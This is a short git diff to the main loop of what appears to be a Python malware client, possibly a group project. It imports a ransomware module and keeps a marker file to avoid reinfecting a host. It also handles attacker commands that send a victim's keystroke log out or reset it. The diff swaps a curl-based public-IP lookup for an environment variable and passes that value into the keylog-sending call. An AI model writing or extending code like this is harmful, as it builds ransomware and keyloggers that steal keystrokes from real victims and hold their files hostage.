@@ -23,8 +23,9 @@ from modules import ransomware
 NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
 
 
-PUBLIC_IP = subprocess.run(['curl', 'ifconfig.co'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
-PUBLIC_IP = PUBLIC_IP.stdout.strip()
+# PUBLIC_IP = subprocess.run(['curl', 'ifconfig.co'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
+# PUBLIC_IP = PUBLIC_IP.stdout.strip()
+PUBLIC_IP = os.environ.get('USER')
 
 print(f'Public IP: {PUBLIC_IP}')
 
@@ -68,7 +69,7 @@ def main():
             # print(result)
             if result[0] == "keylogger":
                 if result[1] == "send_log":
-                    instructions.send_keylog_to_attacker()
+                    instructions.send_keylog_to_attacker(PUBLIC_IP)
                 elif result[1] == "reset_log":
                     instructions.reset_keylog_file()
 
